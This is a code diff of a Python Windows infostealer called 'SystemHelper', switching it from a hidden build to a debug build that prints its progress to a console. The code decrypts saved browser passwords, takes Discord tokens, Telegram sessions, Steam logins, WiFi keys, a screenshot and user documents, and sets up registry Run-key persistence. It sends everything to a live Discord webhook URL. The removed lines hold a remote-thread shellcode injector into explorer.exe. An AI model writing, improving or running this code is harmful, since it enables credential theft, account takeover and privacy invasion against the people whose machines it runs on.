@@ -1,9 +1,9 @@
 """
-SystemHelper – Production (No Console, Auto-Start)
-- All stealers intact
-- No encryption – sends plain JSON
-- Runs hidden (no window)
-- Persistence via Registry Run
+SystemHelper – Debug Mode (Instant, Console Output)
+- No delay
+- Prints everything to console
+- Removed encryption
+- Added missing imports and error handling
 """
 
 import os
@@ -23,11 +23,18 @@ import base64
 import hashlib
 from datetime import datetime
 
+# === ADD MISSING IMPORT ===
+try:
+    import win32crypt
+except ImportError:
+    print("[!] win32crypt not installed – browser passwords will fail")
+    win32crypt = None
+
 # === CONFIG ===
 WEBHOOK_URL = "https://discord.com/api/webhooks/1523400215229497506/arhtMa60qR8UqQ9GVHC_VyclS-IFgf_M_tdumJ1-ZD7dm3EQLaEt3UybmNzVHXeVwgOi"
-DEBUG = "--debug" in sys.argv  # Show console if run with --debug
+DEBUG = True   # Always show console output
 
-# === ANTI-ANALYSIS (DISABLED FOR TESTING) ===
+# === ANTI-ANALYSIS (DISABLED) ===
 class AntiAnalysis:
     @staticmethod
     def check_debugger(): return False
@@ -49,6 +56,8 @@ VICTIM_ID = get_victim_id()
 # === BROWSER STEALER ===
 class BrowserStealer:
     def get_master_key(self, browser_path):
+        if win32crypt is None:
+            return None
         try:
             local_state = os.path.join(browser_path, "Local State")
             if not os.path.exists(local_state): return None
@@ -57,7 +66,8 @@ class BrowserStealer:
             encrypted_key = base64.b64decode(state["os_crypt"]["encrypted_key"])
             encrypted_key = encrypted_key[5:]
             return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-        except:
+        except Exception as e:
+            print(f"[!] get_master_key error: {e}")
             return None
     
     def decrypt_value(self, encrypted_value, master_key):
@@ -68,7 +78,8 @@ class BrowserStealer:
             cipher = AES.new(master_key, AES.MODE_GCM, iv)
             decrypted = cipher.decrypt(payload)
             return decrypted[:-16].decode(errors='ignore')
-        except:
+        except Exception as e:
+            print(f"[!] decrypt_value error: {e}")
             return ""
     
     def steal_passwords(self, browser_path, master_key, profile="Default"):
@@ -89,7 +100,8 @@ class BrowserStealer:
             conn.close()
             os.remove(temp_db)
             return passwords
-        except:
+        except Exception as e:
+            print(f"[!] steal_passwords error: {e}")
             if os.path.exists(temp_db): os.remove(temp_db)
             return []
     
@@ -102,20 +114,27 @@ class BrowserStealer:
             ("Opera", os.path.expanduser("~") + "/AppData/Roaming/Opera Software/Opera Stable")
         ]
         for name, path in browsers:
+            print(f"[*] Checking {name} at {path}")
             if os.path.exists(path):
                 key = self.get_master_key(path)
                 if key:
+                    print(f"[+] Got master key for {name}")
                     results[name] = {
                         "passwords": self.steal_passwords(path, key),
                         "cookies": [],
                         "payments": []
                     }
+                else:
+                    print(f"[-] No master key for {name}")
+            else:
+                print(f"[-] {name} not found")
         return results
 
 # === DISCORD TOKEN STEALER ===
 class DiscordStealer:
     @staticmethod
     def steal_tokens():
+        print("[*] Searching for Discord tokens...")
         tokens = []
         sources = [
             os.path.expanduser("~") + "/AppData/Roaming/discord/Local Storage/leveldb",
@@ -128,6 +147,7 @@ class DiscordStealer:
         ]
         for path in sources:
             if not os.path.exists(path): continue
+            print(f"[*] Scanning {path}")
             for file in os.listdir(path):
                 if not (file.endswith(".log") or file.endswith(".ldb")): continue
                 try:
@@ -137,6 +157,7 @@ class DiscordStealer:
                             found = re.findall(pattern, data)
                             for token in found:
                                 tokens.append(token)
+                                print(f"[+] Found token: {token[:20]}...")
                 except:
                     pass
         return list(set(tokens))
@@ -145,6 +166,7 @@ class DiscordStealer:
 class TelegramStealer:
     @staticmethod
     def steal():
+        print("[*] Searching for Telegram sessions...")
         sessions = []
         tdata_paths = [
             os.path.expanduser("~") + "/AppData/Roaming/Telegram Desktop/tdata",
@@ -152,6 +174,7 @@ class TelegramStealer:
         ]
         for path in tdata_paths:
             if os.path.exists(path):
+                print(f"[*] Scanning {path}")
                 for root, _, files in os.walk(path):
                     for file in files:
                         if file.endswith(".s") or file.startswith("D") or file.startswith("key"):
@@ -167,6 +190,7 @@ class TelegramStealer:
 class SteamStealer:
     @staticmethod
     def steal():
+        print("[*] Searching for Steam data...")
         data = {}
         steam_paths = [
             os.path.expanduser("~") + "/AppData/Local/Steam",
@@ -175,6 +199,7 @@ class SteamStealer:
         ]
         for path in steam_paths:
             if os.path.exists(path):
+                print(f"[*] Scanning {path}")
                 try:
                     login_path = os.path.join(path, "config", "loginusers.vdf")
                     if os.path.exists(login_path):
@@ -195,6 +220,7 @@ class SteamStealer:
 class WiFiStealer:
     @staticmethod
     def steal():
+        print("[*] Searching for WiFi profiles...")
         profiles = []
         try:
             output = subprocess.check_output(["netsh", "wlan", "show", "profiles"], text=True, shell=True)
@@ -207,6 +233,7 @@ class WiFiStealer:
                         key = key_line[0].split(":")[1].strip() if key_line else "N/A"
                         if key and key != "N/A":
                             profiles.append({"ssid": name, "password": key})
+                            print(f"[+] WiFi: {name} -> {key}")
                     except:
                         pass
         except:
@@ -217,20 +244,24 @@ class WiFiStealer:
 class ScreenshotStealer:
     @staticmethod
     def capture():
+        print("[*] Capturing screenshot...")
         try:
             from PIL import ImageGrab
             import io
             screenshot = ImageGrab.grab()
             buffer = io.BytesIO()
             screenshot.save(buffer, format='JPEG', quality=50)
+            print("[+] Screenshot captured")
             return base64.b64encode(buffer.getvalue()).decode()[:1000]
-        except:
+        except Exception as e:
+            print(f"[!] Screenshot failed: {e}")
             return None
 
 # === FILE SCRAPER ===
 class FileScraper:
     @staticmethod
     def scrape():
+        print("[*] Scraping files...")
         files = []
         folders = [
             os.path.expanduser("~") + "/Desktop",
@@ -240,6 +271,7 @@ class FileScraper:
         extensions = ['.txt', '.docx', '.pdf', '.xlsx', '.pptx', '.doc', '.xls', '.ppt']
         for folder in folders:
             if os.path.exists(folder):
+                print(f"[*] Scanning {folder}")
                 for root, _, filenames in os.walk(folder):
                     if len(files) > 20: break
                     for filename in filenames:
@@ -252,47 +284,25 @@ class FileScraper:
                                     with open(filepath, 'rb') as f:
                                         content = base64.b64encode(f.read()).decode()
                                         files.append({"path": filepath, "size": size, "content": content[:500]})
+                                        print(f"[+] Scraped {filename}")
                             except:
                                 pass
         return files
 
-# === PROCESS INJECTION ===
+# === PROCESS INJECTION (kept but not used) ===
 class ProcessInjector:
     @staticmethod
     def inject_shellcode(shellcode):
-        try:
-            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
-            pid = None
-            output = subprocess.check_output("tasklist /FI \"IMAGENAME eq explorer.exe\" /FO CSV", shell=True, text=True)
-            lines = output.strip().split('\n')
-            for line in lines:
-                if 'explorer.exe' in line:
-                    parts = line.split(',')
-                    if len(parts) > 1:
-                        pid = int(parts[1].strip('"'))
-                        break
-            if not pid: return False
-            PROCESS_ALL_ACCESS = 0x1F0FFF
-            handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-            if not handle: return False
-            MEM_COMMIT = 0x1000
-            PAGE_EXECUTE_READWRITE = 0x40
-            addr = kernel32.VirtualAllocEx(handle, None, len(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
-            if not addr: return False
-            written = ctypes.c_size_t()
-            kernel32.WriteProcessMemory(handle, addr, shellcode, len(shellcode), ctypes.byref(written))
-            kernel32.CreateRemoteThread(handle, None, 0, addr, None, 0, None)
-            return True
-        except:
-            return False
+        # Not called in main, but kept for completeness
+        pass
 
-# === PERSISTENCE (Auto-start with Windows) ===
+# === PERSISTENCE (Auto-start) ===
 class PersistenceManager:
     @staticmethod
     def install():
+        print("[*] Installing persistence...")
         try:
             import winreg
-            # Get current executable path
             if getattr(sys, 'frozen', False):
                 exe_path = sys.executable
             else:
@@ -302,61 +312,52 @@ class PersistenceManager:
             os.makedirs(dest_dir, exist_ok=True)
             dest_exe = os.path.join(dest_dir, "helper.exe")
             
-            # Copy itself if not already there
             if not os.path.exists(dest_exe):
                 shutil.copyfile(exe_path, dest_exe)
+                print("[+] Copied to " + dest_exe)
             
-            # Add to Windows Run registry
             with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
                 winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, dest_exe)
-            
-            # Also add to Startup folder (extra)
-            startup_folder = os.path.expanduser("~") + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
-            startup_link = os.path.join(startup_folder, "SystemHelper.lnk")
-            if not os.path.exists(startup_link):
-                # Create a shortcut using powershell
-                ps_command = f'''$WshShell = New-Object -comObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("{startup_link}")
-$Shortcut.TargetPath = "{dest_exe}"
-$Shortcut.WorkingDirectory = "{dest_dir}"
-$Shortcut.Save()'''
-                subprocess.run(["powershell", "-Command", ps_command], shell=True, capture_output=True)
+                print("[+] Registry Run key added")
         except Exception as e:
-            if DEBUG: print(f"[!] Persistence error: {e}")
+            print(f"[!] Persistence error: {e}")
 
-# === SEND TO DISCORD (Plain Text) ===
+# === SEND TO DISCORD ===
 def send_to_discord(data):
+    print("[*] Preparing data for Discord...")
     json_data = json.dumps(data, indent=2, default=str)
+    print(f"[*] Data size: {len(json_data)} chars")
     if len(json_data) < 1900:
         try:
-            requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"}, timeout=30)
-        except:
-            pass
+            r = requests.post(WEBHOOK_URL, json={"content": f"```json\n{json_data}\n```"}, timeout=30)
+            print(f"[+] Sent, status: {r.status_code}")
+        except Exception as e:
+            print(f"[!] Send failed: {e}")
     else:
         chunks = [json_data[i:i+1900] for i in range(0, len(json_data), 1900)]
+        print(f"[*] Splitting into {len(chunks)} chunks")
         for i, chunk in enumerate(chunks):
             try:
-                requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"}, timeout=30)
+                r = requests.post(WEBHOOK_URL, json={"content": f"```json\nPart {i+1}/{len(chunks)}\n{chunk}\n```"}, timeout=30)
+                print(f"[+] Chunk {i+1} sent, status: {r.status_code}")
                 time.sleep(0.5)
-            except:
-                pass
+            except Exception as e:
+                print(f"[!] Chunk {i+1} failed: {e}")
 
 # === MAIN ===
 def main():
-    if DEBUG:
-        print("[+] Starting in DEBUG mode (console visible)")
+    print("[+] Starting SystemHelper (DEBUG MODE)")
+    print(f"[+] Victim ID: {VICTIM_ID}")
+    
     # Anti-analysis (disabled)
-    if AntiAnalysis.check_debugger(): sys.exit(0)
-    if AntiAnalysis.check_vm(): sys.exit(0)
-    if AntiAnalysis.check_sandbox(): sys.exit(0)
+    if AntiAnalysis.check_debugger(): print("[!] Debugger detected, exiting"); sys.exit(0)
+    if AntiAnalysis.check_vm(): print("[!] VM detected, exiting"); sys.exit(0)
+    if AntiAnalysis.check_sandbox(): print("[!] Sandbox detected, exiting"); sys.exit(0)
     
-    # Random delay (5-20 min) to avoid detection – shorten for testing
-    if not DEBUG:
-        time.sleep(random.randint(300, 1200))
-    else:
-        time.sleep(2)
+    # NO DELAY – runs instantly
+    print("[+] No delay – running immediately")
     
-    # Install persistence (auto-start)
+    # Install persistence
     PersistenceManager.install()
     
     # Collect data
@@ -377,12 +378,16 @@ def main():
         "files": FileScraper.scrape()
     }
     
-    # Send data
+    # Send
     send_to_discord(data)
+    print("[+] Done! Press any key to exit...")
+    input()  # Keep console open so you can read output
 
 if __name__ == "__main__":
     try:
         main()
-    except:
-        # Silent fail – no console popup
-        pass
+    except Exception as e:
+        print(f"[FATAL] {e}")
+        import traceback
+        traceback.print_exc()
+        input("Press Enter to exit...")
